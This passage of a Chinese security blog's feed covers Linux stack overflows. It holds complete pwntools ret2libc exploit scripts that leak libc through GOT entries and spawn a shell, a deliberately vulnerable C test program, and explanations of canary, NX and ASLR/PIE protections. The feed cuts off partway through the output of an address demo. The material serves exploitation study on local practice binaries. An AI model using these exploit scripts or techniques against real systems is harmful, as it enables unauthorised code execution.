基地址</p></li><li><p>如果我们知道<strong>libc.so</strong>中某个函数的地址，那么我们就可以确定该程序利用的<strong>libc.so</strong>。进而我们就可以知道<code>system()</code>函数的地址。通过<code>puts()</code>泄露某个已执行过的函数的GOT地址，并且返回地址设置为_start()或main()，以便于重新执行一遍程序；</p></li></ul><p>简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。</p><p>我们可以看下本题的_start()函数内容，其包含main()和__libc_start_main()函数的调用，也就是说，它才是程序真正的入口</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/22.png" alt="img"></p><p>那么我们就可以编写EXP了，这个EXP就算开启了ASLR的话都是狂野利用的，所以我们这边绕过了<strong>NX</strong>保护和<strong>ASLR</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts plt: &quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts got: &quot;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]_start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">112</span>, puts_plt, start_addr, puts_got])<span class="comment">#把puts_got地址放到栈中参数位置</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))<span class="comment">#获取到输出的值，里面带有我们放入的puts_got地址</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak puts addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#获取相对偏移</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#</span></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]system addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]binsh addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload2 to getshell...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">&quot;B&quot;</span> * <span class="number">112</span>, system_addr, <span class="string">&quot;CCCC&quot;</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/23.png" alt="image-20201121164703334"></p><blockquote><h2 id="绕过ASLR保护"><a href="#绕过ASLR保护" class="headerlink" title="绕过ASLR保护"></a>绕过ASLR保护</h2></blockquote><p>测试代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line"><span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">vuln_func</span>();</span><br><span class="line"><span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -z noexecstack -no-pie test.c -o test.out</span></span><br></pre></td></tr></table></figure><p>首先检查题目的保护和是否开启了ASLR保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7f71000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7da0000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f73000)</span><br><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7fba000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7de9000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure><p>运行的时候查看下加载了什么动态链接库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line">0xf7fd9860  0xf7ff28dd  Yes (*)     /lib/ld-linux.so.2</span><br><span class="line">0xf7e1d750  0xf7f4696d  Yes (*)     /lib32/libc.so.6</span><br></pre></td></tr></table></figure><p>题目的思路：由于程序未开启PIE，导致程序本身的地址是固定的，我们可以通过write()函数进行信息泄露，打印出libc的地址，进而计算system()的地址</p><p>EXP就分为两个流程：</p><ul><li>通过payload在vuln_func中进行栈溢出，调用write@plt 打印出write@got，完成后又返回到vuln_func中</li><li>通过再次溢出调用计算出相对地址的system函数获得shell</li></ul><p>首先查看溢出位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  pattern create 200</span><br><span class="line">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/ascotbe/Desktop/Pwn/test.out </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xc9 </span><br><span class="line">EBX: 0x6c414150 (&#x27;PAAl&#x27;)</span><br><span class="line">ECX: 0xffffcd80 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)</span><br><span class="line">EDX: 0x100 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EBP: 0x41514141 (&#x27;AAQA&#x27;)</span><br><span class="line">ESP: 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">EIP: 0x41416d41 (&#x27;AmAA&#x27;)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41416d41</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0004| 0xffffce14 (&quot;AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0008| 0xffffce18 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0012| 0xffffce1c (&quot;TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0016| 0xffffce20 (&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0020| 0xffffce24 (&quot;ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0024| 0xffffce28 (&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0028| 0xffffce2c (&quot;AAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41416d41 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41416d41</span><br><span class="line">1094806849 found at offset: 140</span><br></pre></td></tr></table></figure><p>编写EXP，运行环境Ubuntu 16.04 Python3.8 （Ubuntu20.04 Python3.8无法运行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coidng: utf-8 -*-</span></span><br><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">write_plt=elf.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#elf.plt[&#x27;write&#x27;]</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln_func_addr = elf.symbols[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span> * <span class="number">140</span>).encode()+ p32(write_plt)+p32(vuln_func_addr)+p32(<span class="number">1</span> )+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#&quot;A&quot; * 140是溢出需要的字节</span></span><br><span class="line"><span class="comment">#write(1,address,4)表示将address向外写</span></span><br><span class="line"><span class="built_in">print</span>(payload1)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#获取相对偏移</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/26.png" alt="image-20210325200443317"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/c90530c910b0</span><br><span class="line">https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc</span><br><span class="line">《ctf竞赛权威指南（PWN篇）》</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x01）</title>
    <link href="https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/"/>
    <id>https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/</id>
    <published>2020-11-19T10:45:42.000Z</published>
    <updated>2022-04-07T12:44:15.452Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>记录下自己学习堆栈溢出的内容，这篇就是栈溢出入门的东西，也算是栈溢出总结的上篇，缝合怪文章大部分都是参考各个师傅的文章。写文章的初心是为了总结梳理下自己的学习过程。22年重新修改部分内容</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/1.gif" alt="74CBF97F98866D946732450F281B1AD0"></p><blockquote><h3 id="栈溢出利用方式"><a href="#栈溢出利用方式" class="headerlink" title="栈溢出利用方式"></a>栈溢出利用方式</h3></blockquote><ul><li>ROP（修改返回地址，让其指向内存中已有的一段指令<ul><li>ret2shellcode（修改返回地址，让其指向溢出数据中的一段指令</li><li>ret2libc（修改返回地址，让其指向内存中已有的某个函数</li><li>BROP</li><li>ret2dl-resolve</li><li>SROP</li></ul></li></ul><blockquote><h3 id="常用保护机制"><a href="#常用保护机制" class="headerlink" title="常用保护机制"></a>常用保护机制</h3></blockquote><h4 id="CANNARY金丝雀-栈保护-x2F-Stack-protect-x2F-栈溢出保护"><a href="#CANNARY金丝雀-栈保护-x2F-Stack-protect-x2F-栈溢出保护" class="headerlink" title="CANNARY金丝雀(栈保护)&#x2F;Stack protect&#x2F;栈溢出保护"></a><strong>CANNARY金丝雀(栈保护)&#x2F;Stack protect&#x2F;栈溢出保护</strong></h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                       <span class="comment">#默认情况下，不开启Canary保护</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#禁用栈保护</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c     <span class="comment">#启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c <span class="comment">#启用堆栈保护，为所有函数插入保护代码</span></span><br></pre></td></tr></table></figure><hr><h4 id="FORTIFY-x2F-轻微的检查"><a href="#FORTIFY-x2F-轻微的检查" class="headerlink" title="FORTIFY&#x2F;轻微的检查"></a><strong>FORTIFY&#x2F;轻微的检查</strong></h4><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                        <span class="comment">#默认情况下，不会开这个检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c    <span class="comment">#较弱的检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c    <span class="comment">#较强的检查</span></span><br></pre></td></tr></table></figure><hr><h4 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>工作原理如图：<br><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/2.png" alt="img"></p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                <span class="comment">#默认情况下，开启NX保护</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c   <span class="comment">#禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c <span class="comment">#开启NX保护</span></span><br></pre></td></tr></table></figure><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><hr><h4 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h4><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><div class="note default modern"><p>如果只开启ASLR的话，本身二进制程序是不支持随机化加载的，所以就出现了ret2plt、GOT表劫持、地址爆破等</p></div><p>内存地址随机化机制（address space layout randomization)，有以下四种情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br><span class="line">2+PIE - 全部随机化</span><br></pre></td></tr></table></figure><table><thead><tr><th>ASLR</th><th>Executable</th><th>PLT</th><th>Heap</th><th>Stack</th><th>Shared libraries</th></tr></thead><tbody><tr><td>0</td><td>✖</td><td>✖</td><td>✖</td><td>✖</td><td>✖</td></tr><tr><td>1</td><td>✖</td><td>✖</td><td>✖</td><td>✔</td><td>✔</td></tr><tr><td>2</td><td>✖</td><td>✖</td><td>✔</td><td>✔</td><td>✔</td></tr><tr><td>2+PIE</td><td>✔</td><td>✔</td><td>✔</td><td>✔</td><td>✔</td></tr></tbody></table><p>使用一个程序来演示下上表的内容</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> stack;</span><br><span class="line"><span class="type">int</span> *heap = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="type">void</span> *handle = <span class="built_in">dlopen</span>(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;executable: %p\n&quot;</span>, &amp;main);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system@plt: %p\n&quot;</span>, &amp;system);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap: %p\n&quot;</span>, heap);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stack: %p\n&quot;</span>, &amp;stack);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;libc: %p\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(heap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc test.c -no-pie -fno-pie -ldl</span></span><br></pre></td></tr></table></figure><h5 id="未开启ASLR和PIE"><a href="#未开启ASLR和PIE" class="headerlink" title="未开启ASLR和PIE"></a>未开启ASLR和PIE</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn<span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn<span class="comment"># ./a.out </span></span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn<span class="comment"># ./a.out </span></span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br></pre></td></tr></table></figure><p>可以看到所有的地址都不变</p><h5 id="开启ALSR未开启PIE"><a href="#开启ALSR未开启PIE" class="headerlink" title="开启ALSR未开启PIE"></a>开启ALSR未开启PIE</h5><h6 id="部分开启时"><a href="#部分开启时" class="headerlink" title="部分开启时"></a>部分开启时</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# echo 1 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# ./a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7ffdde37ce04</span><br><span class="line">libc: 0x7f8ef1525500</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# ./a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 